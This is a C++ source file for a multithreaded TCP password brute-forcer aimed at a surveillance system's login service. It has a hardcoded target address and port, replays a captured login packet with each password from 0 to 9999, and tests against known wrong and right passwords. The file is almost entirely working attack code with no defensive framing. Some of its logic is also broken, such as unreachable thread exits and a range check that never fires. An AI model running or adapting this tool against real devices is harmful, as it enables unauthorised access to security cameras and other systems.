/******************************************************************************
*  @file tcp_brute.cpp
*  @brief tcp_brute: Generic Network Brute-force
*  @version 3.0.0
*  @author Ara Khachatryan
******************************************************************************/
#include <iostream>
#include <iomanip>  // for setw()
#include <cstring>  // for memcpy()
#include <unistd.h> // for sleep()

#include <pthread.h>

#include "namespace_terminal.hpp" // namespace terminal

/******************************************************************************
* @brief include all the data from hex_data.cpp source file that will be used in
*        Surviliance system bruteforce
* type: static unsigned char
* login_data_NULL[116] - login message with NULL password
* login_data_1020[116] - login message with 1020 password
* login_data_5050[116] - login message with 5050 password
* COMMAND_LOGIN_FAIL[18] - keyword send from target in case of wrong password
* admin[5] - login name within login message
******************************************************************************/



// enable or disable color printing in linux terminal
bool terminal_color = true;

// enable or disable debugging
bool DEBUG_MODE = true;

const char * IP_ADDRESS = "10.1.1.16";
short int PORT_NUMBER = 3000;
short int NUM_THREADS = 10; // from 0 to 99
long int PASSWD_RANGE_START = 0;
long int PASSWD_RANGE_END = 9999;



// create thread argument struct for bruteforce_thread()
typedef struct _thread_data_t
{
	int  thread_id;
	unsigned long int t_passwd;
	unsigned long int t_pw_range_end;
} thread_data_t;

extern void print_hex_data( unsigned char *hex_data, size_t data_length );
extern void repl_hex_data(unsigned char *hex_data, unsigned long int password);
extern short int tcp_login( unsigned char* login_data, std::string& FCN_msg );

extern unsigned char login_data_1020;
extern unsigned char login_data_5050;
extern const unsigned char login_data_NULL;

void tcp_login_test();
void init_thread_args( thread_data_t* t_data );
void thread_debug_msg( std::string& FCN_msg, int threadID,
						unsigned long int passwd );
void* bruteforce_thread( void* thread_arg );



int main( )
{
	// test an tcp_login() function for false and true passwords
	tcp_login_test();
	
	int rc;
	
	// declare a pthread_t thread descriptor array
	pthread_t thread[NUM_THREADS];
	// declare a thread_data_t argument array
	thread_data_t t_data[NUM_THREADS];
	// initialize thread arguments array
	init_thread_args( t_data );
	
	// Initialize thread attribute and set thread joinable
	pthread_attr_t attr;
	pthread_attr_init(&attr);
	pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
	
	// create threads
	for ( int i = 0; i < NUM_THREADS; ++i )
	{
		rc = pthread_create(&thread[i], &attr, bruteforce_thread, &t_data[i]);
		if ( rc )
		{
			std::cerr << "error: pthread_create, rc: " << rc << std::endl;
			std::exit(1);
		}
	}
		
	sleep(4);	
	std::cout << terminal::TEXT_BOLD << terminal::TEXTCOLOR_MAGENDA
				<< " +++ ALL DONE +++ " 
				<< terminal::RESET_ALL << std::endl;
	
	// free attribute and wait for the other threads
	pthread_attr_destroy(&attr);

	pthread_exit(NULL);
	
	return 0;
}


void init_thread_args( thread_data_t* t_data )
{
	unsigned long int segment = PASSWD_RANGE_START;
	
	for ( int i = 0; i < NUM_THREADS; ++i )
	{
		t_data[i].thread_id = i;
		t_data[i].t_passwd = segment;
		segment += (PASSWD_RANGE_END - PASSWD_RANGE_START)/NUM_THREADS;
		if( i == NUM_THREADS )
		{
			t_data[i].t_pw_range_end = PASSWD_RANGE_END;
		}
		else
		{
			t_data[i].t_pw_range_end = segment;
		}
		++segment;
	}
}



void* bruteforce_thread( void* thread_arg )
{

	thread_data_t* t_data = (thread_data_t*)thread_arg;
	short int threadID = t_data->thread_id;
	unsigned long int passwd;
	
	std::ostringstream strStream;
	strStream << "Thread " << t_data->thread_id << " is strarting" << "\n";
	std::string thread_start_msg = strStream.str();
	std::cout << thread_start_msg << std::flush;
	
	unsigned long int count_loop = 0;
	
	for ( passwd = t_data->t_passwd; passwd <= (t_data->t_pw_range_end); passwd++ )
	{
		// cout thread loop for debuginng purpose
//		std::cout << "Loop " << count_loop << " from thread " << threadID
//					<< " is strarting" << std::endl;
		
		++count_loop;
		
		/**********************************************************************
		* initialize login_data with NULLs, copy login_data_NULL's
		* information to the login_data, then set current t_data->t_passwd
		**********************************************************************/
		unsigned char *login_data = nullptr;
		login_data = new unsigned char[116]();
		memcpy(login_data, &login_data_NULL, 116);
		repl_hex_data(login_data, passwd);
		
		std::string FCN_msg;
		short int result;
		
		if ( DEBUG_MODE )
		{
			result = tcp_login( login_data, FCN_msg );
			thread_debug_msg(FCN_msg, threadID, passwd);
		}else{
			result = tcp_login( login_data, FCN_msg );
		}
		
		// print current login_data for debugging purpose
//		print_hex_data( login_data, 116 );
		
		delete [] login_data;
		
		if ( result == -1 )        // core error occurred
		{
			continue;
		} else if ( result == 0 )  // password not match, no errors
		{
			continue;
		} else if ( result == 1 )  // password is found!!!
		{
			break;
			pthread_exit(NULL);
			
		} else if ( result == 2 )  // second reply from target not recognized
		{
			continue;
		}
		
	} // End for loop
	
	pthread_exit(NULL);
	
}



void thread_debug_msg( std::string& FCN_msg, int threadID,
                       unsigned long int passwd )
{
	std::ostringstream stringStream;
	
	stringStream << "TID ";
	stringStream << terminal::TEXT_BOLD << terminal::TEXTCOLOR_YELLOW;
	stringStream << std::left << std::setw(3) << threadID;
	stringStream << terminal::RESET_ALL;
	stringStream << "PW ";
	stringStream << terminal::TEXT_BOLD << terminal::TEXTCOLOR_YELLOW;
	stringStream << std::left << std::setw(8) << passwd;
	stringStream << terminal::RESET_ALL;
	
	stringStream << FCN_msg;
	stringStream << "\n";
		
	std::cout << stringStream.str() << std::flush;
}



void tcp_login_test()
{
	/**********************************************************************
	* probe for false "5050" and true "1020" passwords --->>
	**********************************************************************/
	std::string FCN_test_msg;
	
	std::cout << terminal::Erase_Display();
	std::cout << terminal::Cursor_Position(0, 0);
	
	std::cout << std::endl << "Login raw data with false password: 5050 --->>"
			  << std::endl;
	print_hex_data( &login_data_5050, 116 );
	
	tcp_login( &login_data_5050, FCN_test_msg );
	std::cout << "tcp_login() -> " << FCN_test_msg << std::endl;
	FCN_test_msg.clear();
	
	sleep(2);
	
	std::cout << std::endl << "Login raw data with true password: 1020 --->>"
			  << std::endl;
	print_hex_data( &login_data_1020, 116 );
	
	tcp_login( &login_data_1020, FCN_test_msg );
	std::cout << "tcp_login() -> " << FCN_test_msg << std::endl;
	FCN_test_msg.clear();
	
	sleep(3);
	
	std::cout << std::endl;
}
